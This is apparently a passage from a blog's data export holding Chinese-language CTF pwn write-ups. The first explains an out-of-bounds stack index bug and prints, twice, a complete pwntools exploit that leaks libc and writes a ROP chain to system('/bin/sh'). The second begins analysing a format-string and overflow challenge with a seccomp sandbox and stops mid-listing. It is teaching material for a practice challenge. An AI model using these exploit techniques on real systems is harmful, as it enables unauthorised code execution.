class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">read_num</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;Idx:&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">write_num</span>(<span class=\"params\">idx,num</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;Idx:&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;Num:&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(num))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak libc</span></span><br><span class=\"line\">read_num(<span class=\"number\">0x108</span>)</span><br><span class=\"line\">ru(<span class=\"string\">&#x27;The num: &#x27;</span>)</span><br><span class=\"line\">data1=<span class=\"built_in\">eval</span>(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>])</span><br><span class=\"line\">read_num(<span class=\"number\">0x109</span>)</span><br><span class=\"line\">ru(<span class=\"string\">&#x27;The num: &#x27;</span>)</span><br><span class=\"line\">data2=<span class=\"built_in\">eval</span>(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 0x7f2de618e000 0x7f576d980000</span></span><br><span class=\"line\"><span class=\"comment\"># 0x7f2de63af620 0x7f576dba1620</span></span><br><span class=\"line\"><span class=\"comment\"># offset=0x221620      0x221620 </span></span><br><span class=\"line\"></span><br><span class=\"line\">leak(<span class=\"string\">&#x27;data1&#x27;</span>,<span class=\"built_in\">hex</span>(data1))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;data2&#x27;</span>,<span class=\"built_in\">hex</span>(data2))</span><br><span class=\"line\">libcbase=u64((p32(data1)+p16(data2)).ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))-<span class=\"number\">0x221620</span></span><br><span class=\"line\">leak(<span class=\"string\">&#x27;libcbase&#x27;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\"></span><br><span class=\"line\">sys_addr=libcbase+libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">binsh_addr=libcbase+<span class=\"number\">0x00000000001b45bd</span></span><br><span class=\"line\">pop_rdi=libcbase+<span class=\"number\">0x0000000000023b6a</span></span><br><span class=\"line\">ret_addr=libcbase+<span class=\"number\">0x0000000000022679</span></span><br><span class=\"line\">leak(<span class=\"string\">&#x27;system&#x27;</span>,<span class=\"built_in\">hex</span>(sys_addr))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;binsh&#x27;</span>,<span class=\"built_in\">hex</span>(binsh_addr))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;pop rdi&#x27;</span>,<span class=\"built_in\">hex</span>(pop_rdi))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;ret&#x27;</span>,<span class=\"built_in\">hex</span>(ret_addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Overwrite</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ret</span></span><br><span class=\"line\">payload1=u32(p64(ret_addr)[:<span class=\"number\">4</span>])</span><br><span class=\"line\">payload2=u16(p64(ret_addr)[<span class=\"number\">4</span>:<span class=\"number\">6</span>])</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;payload1&#x27;</span>,<span class=\"built_in\">hex</span>(payload1))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;payload2&#x27;</span>,<span class=\"built_in\">hex</span>(payload2))</span><br><span class=\"line\">write_num(<span class=\"number\">0x106</span>,payload1)</span><br><span class=\"line\">write_num(<span class=\"number\">0x107</span>,payload2)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># rip</span></span><br><span class=\"line\">payload1=u32(p64(pop_rdi)[:<span class=\"number\">4</span>])</span><br><span class=\"line\">payload2=u16(p64(pop_rdi)[<span class=\"number\">4</span>:<span class=\"number\">6</span>])</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;payload1&#x27;</span>,<span class=\"built_in\">hex</span>(payload1))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;payload2&#x27;</span>,<span class=\"built_in\">hex</span>(payload2))</span><br><span class=\"line\">write_num(<span class=\"number\">0x108</span>,payload1)</span><br><span class=\"line\">write_num(<span class=\"number\">0x109</span>,payload2)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#binsh</span></span><br><span class=\"line\">payload1=u32(p64(binsh_addr)[:<span class=\"number\">4</span>])</span><br><span class=\"line\">payload2=u16(p64(binsh_addr)[<span class=\"number\">4</span>:<span class=\"number\">6</span>])</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;payload1&#x27;</span>,<span class=\"built_in\">hex</span>(payload1))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;payload2&#x27;</span>,<span class=\"built_in\">hex</span>(payload2))</span><br><span class=\"line\">write_num(<span class=\"number\">0x10a</span>,payload1)</span><br><span class=\"line\">write_num(<span class=\"number\">0x10b</span>,payload2)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#system</span></span><br><span class=\"line\">payload1=u32(p64(sys_addr)[:<span class=\"number\">4</span>])</span><br><span class=\"line\">payload2=u16(p64(sys_addr)[<span class=\"number\">4</span>:<span class=\"number\">6</span>])</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;payload1&#x27;</span>,<span class=\"built_in\">hex</span>(payload1))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;payload2&#x27;</span>,<span class=\"built_in\">hex</span>(payload2))</span><br><span class=\"line\">write_num(<span class=\"number\">0x10c</span>,payload1)</span><br><span class=\"line\">write_num(<span class=\"number\">0x10d</span>,payload2)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get shell</span></span><br><span class=\"line\">ru(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#debug(&#x27;b main&#x27;)</span></span><br><span class=\"line\">sl(<span class=\"string\">&#x27;0&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"<p>NewStar，感觉是纯算偏移的题</p>\n<p>64位栈溢出（但不是通常的栈溢出），保护全开。</p>","more":"<p>程序中有Read和Write两个功能，会对栈上的一个变量num(rbp-0x410)，进行读写，在汇编中可以看到每个idx对应4byte。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:<span class=\"number\">0000000000000</span>A8D                 mov     eax, [rbp+num_to_write]</span><br><span class=\"line\">.text:<span class=\"number\">0000000000000</span>A93                 mov     ecx, [rbp+idx]</span><br><span class=\"line\">.text:<span class=\"number\">0000000000000</span>A99                 mov     edx, eax</span><br><span class=\"line\">.text:<span class=\"number\">0000000000000</span>A9B                 mov     eax, ecx</span><br><span class=\"line\">.text:<span class=\"number\">0000000000000</span>A9D                 mov     [rbp+rax*<span class=\"number\">4</span>+nums], edx</span><br></pre></td></tr></table></figure>\n\n<p>主要的漏洞在于没有对下标进行检查，相当于可以任意读和任意写。</p>\n<p>首先我们要先泄露libc地址，通过Read rip处的内容(num+0x420)，处理后可得到libcbase。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#leak libc</span></span><br><span class=\"line\">read_num(<span class=\"number\">0x108</span>)</span><br><span class=\"line\">ru(<span class=\"string\">&#x27;The num: &#x27;</span>)</span><br><span class=\"line\">data1=<span class=\"built_in\">eval</span>(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>])</span><br><span class=\"line\">read_num(<span class=\"number\">0x109</span>)</span><br><span class=\"line\">ru(<span class=\"string\">&#x27;The num: &#x27;</span>)</span><br><span class=\"line\">data2=<span class=\"built_in\">eval</span>(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">leak(<span class=\"string\">&#x27;data1&#x27;</span>,<span class=\"built_in\">hex</span>(data1))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;data2&#x27;</span>,<span class=\"built_in\">hex</span>(data2))</span><br><span class=\"line\">libcbase=u64((p32(data1)+p16(data2)).ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))-<span class=\"number\">0x221620</span><span class=\"comment\">#偏移是调试的时候算出来的</span></span><br><span class=\"line\">leak(<span class=\"string\">&#x27;libcbase&#x27;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br></pre></td></tr></table></figure>\n\n<p>leak libcbase之后，我们就可以得到ret、pop_rdi、system和/bin/sh的地址。</p>\n<p>之后通过Write将地址写进去就可以了，只是处理输入有些麻烦。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># get shell</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ret</span></span><br><span class=\"line\">payload1=u32(p64(ret_addr)[:<span class=\"number\">4</span>])</span><br><span class=\"line\">payload2=u16(p64(ret_addr)[<span class=\"number\">4</span>:<span class=\"number\">6</span>])</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;payload1&#x27;</span>,<span class=\"built_in\">hex</span>(payload1))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;payload2&#x27;</span>,<span class=\"built_in\">hex</span>(payload2))</span><br><span class=\"line\">write_num(<span class=\"number\">0x106</span>,payload1)</span><br><span class=\"line\">write_num(<span class=\"number\">0x107</span>,payload2)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># rip</span></span><br><span class=\"line\">payload1=u32(p64(pop_rdi)[:<span class=\"number\">4</span>])</span><br><span class=\"line\">payload2=u16(p64(pop_rdi)[<span class=\"number\">4</span>:<span class=\"number\">6</span>])</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;payload1&#x27;</span>,<span class=\"built_in\">hex</span>(payload1))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;payload2&#x27;</span>,<span class=\"built_in\">hex</span>(payload2))</span><br><span class=\"line\">write_num(<span class=\"number\">0x108</span>,payload1)</span><br><span class=\"line\">write_num(<span class=\"number\">0x109</span>,payload2)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#binsh</span></span><br><span class=\"line\">payload1=u32(p64(binsh_addr)[:<span class=\"number\">4</span>])</span><br><span class=\"line\">payload2=u16(p64(binsh_addr)[<span class=\"number\">4</span>:<span class=\"number\">6</span>])</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;payload1&#x27;</span>,<span class=\"built_in\">hex</span>(payload1))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;payload2&#x27;</span>,<span class=\"built_in\">hex</span>(payload2))</span><br><span class=\"line\">write_num(<span class=\"number\">0x10a</span>,payload1)</span><br><span class=\"line\">write_num(<span class=\"number\">0x10b</span>,payload2)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#system</span></span><br><span class=\"line\">payload1=u32(p64(sys_addr)[:<span class=\"number\">4</span>])</span><br><span class=\"line\">payload2=u16(p64(sys_addr)[<span class=\"number\">4</span>:<span class=\"number\">6</span>])</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;payload1&#x27;</span>,<span class=\"built_in\">hex</span>(payload1))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;payload2&#x27;</span>,<span class=\"built_in\">hex</span>(payload2))</span><br><span class=\"line\">write_num(<span class=\"number\">0x10c</span>,payload1)</span><br><span class=\"line\">write_num(<span class=\"number\">0x10d</span>,payload2)</span><br></pre></td></tr></table></figure>\n\n<p>exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;pwn2&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class=\"line\">p=process(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#p=remote(&#x27;&#x27;,)</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">read_num</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;Idx:&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">write_num</span>(<span class=\"params\">idx,num</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;Idx:&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;Num:&#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(num))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak libc</span></span><br><span class=\"line\">read_num(<span class=\"number\">0x108</span>)</span><br><span class=\"line\">ru(<span class=\"string\">&#x27;The num: &#x27;</span>)</span><br><span class=\"line\">data1=<span class=\"built_in\">eval</span>(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>])</span><br><span class=\"line\">read_num(<span class=\"number\">0x109</span>)</span><br><span class=\"line\">ru(<span class=\"string\">&#x27;The num: &#x27;</span>)</span><br><span class=\"line\">data2=<span class=\"built_in\">eval</span>(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[:-<span class=\"number\">1</span>])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 0x7f2de618e000 0x7f576d980000</span></span><br><span class=\"line\"><span class=\"comment\"># 0x7f2de63af620 0x7f576dba1620</span></span><br><span class=\"line\"><span class=\"comment\"># offset=0x221620      0x221620 </span></span><br><span class=\"line\"></span><br><span class=\"line\">leak(<span class=\"string\">&#x27;data1&#x27;</span>,<span class=\"built_in\">hex</span>(data1))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;data2&#x27;</span>,<span class=\"built_in\">hex</span>(data2))</span><br><span class=\"line\">libcbase=u64((p32(data1)+p16(data2)).ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))-<span class=\"number\">0x221620</span></span><br><span class=\"line\">leak(<span class=\"string\">&#x27;libcbase&#x27;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\"></span><br><span class=\"line\">sys_addr=libcbase+libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">binsh_addr=libcbase+<span class=\"number\">0x00000000001b45bd</span></span><br><span class=\"line\">pop_rdi=libcbase+<span class=\"number\">0x0000000000023b6a</span></span><br><span class=\"line\">ret_addr=libcbase+<span class=\"number\">0x0000000000022679</span></span><br><span class=\"line\">leak(<span class=\"string\">&#x27;system&#x27;</span>,<span class=\"built_in\">hex</span>(sys_addr))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;binsh&#x27;</span>,<span class=\"built_in\">hex</span>(binsh_addr))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;pop rdi&#x27;</span>,<span class=\"built_in\">hex</span>(pop_rdi))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;ret&#x27;</span>,<span class=\"built_in\">hex</span>(ret_addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Overwrite</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ret</span></span><br><span class=\"line\">payload1=u32(p64(ret_addr)[:<span class=\"number\">4</span>])</span><br><span class=\"line\">payload2=u16(p64(ret_addr)[<span class=\"number\">4</span>:<span class=\"number\">6</span>])</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;payload1&#x27;</span>,<span class=\"built_in\">hex</span>(payload1))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;payload2&#x27;</span>,<span class=\"built_in\">hex</span>(payload2))</span><br><span class=\"line\">write_num(<span class=\"number\">0x106</span>,payload1)</span><br><span class=\"line\">write_num(<span class=\"number\">0x107</span>,payload2)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># rip</span></span><br><span class=\"line\">payload1=u32(p64(pop_rdi)[:<span class=\"number\">4</span>])</span><br><span class=\"line\">payload2=u16(p64(pop_rdi)[<span class=\"number\">4</span>:<span class=\"number\">6</span>])</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;payload1&#x27;</span>,<span class=\"built_in\">hex</span>(payload1))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;payload2&#x27;</span>,<span class=\"built_in\">hex</span>(payload2))</span><br><span class=\"line\">write_num(<span class=\"number\">0x108</span>,payload1)</span><br><span class=\"line\">write_num(<span class=\"number\">0x109</span>,payload2)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#binsh</span></span><br><span class=\"line\">payload1=u32(p64(binsh_addr)[:<span class=\"number\">4</span>])</span><br><span class=\"line\">payload2=u16(p64(binsh_addr)[<span class=\"number\">4</span>:<span class=\"number\">6</span>])</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;payload1&#x27;</span>,<span class=\"built_in\">hex</span>(payload1))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;payload2&#x27;</span>,<span class=\"built_in\">hex</span>(payload2))</span><br><span class=\"line\">write_num(<span class=\"number\">0x10a</span>,payload1)</span><br><span class=\"line\">write_num(<span class=\"number\">0x10b</span>,payload2)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#system</span></span><br><span class=\"line\">payload1=u32(p64(sys_addr)[:<span class=\"number\">4</span>])</span><br><span class=\"line\">payload2=u16(p64(sys_addr)[<span class=\"number\">4</span>:<span class=\"number\">6</span>])</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;payload1&#x27;</span>,<span class=\"built_in\">hex</span>(payload1))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;payload2&#x27;</span>,<span class=\"built_in\">hex</span>(payload2))</span><br><span class=\"line\">write_num(<span class=\"number\">0x10c</span>,payload1)</span><br><span class=\"line\">write_num(<span class=\"number\">0x10d</span>,payload2)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get shell</span></span><br><span class=\"line\">ru(<span class=\"string\">&#x27;&gt; &#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#debug(&#x27;b main&#x27;)</span></span><br><span class=\"line\">sl(<span class=\"string\">&#x27;0&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>"},{"title":"XHLJ_MessageBoard","date":"2023-03-01T01:17:56.000Z","_content":"\n一道栈的题目，开了沙箱，需要通过栈溢出利用代码片段进行连续的栈迁移来写入ROP链并跳转执行ROP链。\n\n<!--more-->\n\n保护只开了NX。\n\n```sh\n[*] '/home/alphonse/CTF_GAME/XHLJ/MessageBoard/pwn'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x400000)\n```\n\n看看沙箱，禁用了`execve()`\n\n```sh\n line  CODE  JT   JF      K\n=================================\n 0000: 0x20 0x00 0x00 0x00000004  A = arch\n 0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007\n 0002: 0x20 0x00 0x00 0x00000000  A = sys_number\n 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005\n 0004: 0x15 0x00 0x02 0xffffffff  if (A != 0xffffffff) goto 0007\n 0005: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0007\n 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n 0007: 0x06 0x00 0x00 0x00000000  return KILL\n```\n\n程序的漏洞点比较明显，有一个格式化字符串和一个0x10byte的栈溢出\n\n```c\n__int64 __fastcall main(__int64 a1, char **a2, char **a3)\n{\n  char *v3; // rax\n  char buf[8]; // [rsp+0h] [rbp-C0h] BYREF\n  char dest[8]; // [rsp+8h] [rbp-B8h] BYREF\n  char v7[176]; // [rsp+10h] [rbp-B0h] BYREF\n\n  init();\n  if ( !welcome_count )\n  {\n    strcpy(dest, \"Hello, \");\n    puts(\"Welcome to DASCTF message board, please leave your name:\");\n    read(0, buf, 8uLL);\n    welcome_count = 1;\n  }\n  v3 = strcat(dest, buf);\n  printf(v3);                                   // 格式化字符串\n  puts(\"Now, please say something to DASCTF:\");\n  read(0, v7, 192uLL);                          // 溢出0x10byte\n  puts(\"Posted Successfully~\");\n  return 0LL;\n}\n```\n\n格式化字符串漏洞可以用于leak libcbase或者栈地址。但我们只能输入8byte，因此如果偏移大于10的话，我们只能泄露出一个地址。经过调试可以发现libc地址在**偏移为24**的位置，因此只能泄露栈地址或者libc地址。\n\n如果只泄露栈地址的话，栈迁移回到缓冲区开头处后，由于不知道libcbase，因此利用不了libc中的函数，并且由于NX保护开启，无法ret2shellcode。所以只能选择泄露libc地址，**栈迁移到bss段后走ROP链**。\n\n但接下来就会遇到一个问题，在输入了一次之后程序就结束了，程序中没有直接将ROP链写入bss段，但我们可以**利用主程序中read的代码片段**进行写入，read的代码片段如下：\n\n```asm\n.text:0000000000401378 48 8D 85 50 FF FF FF          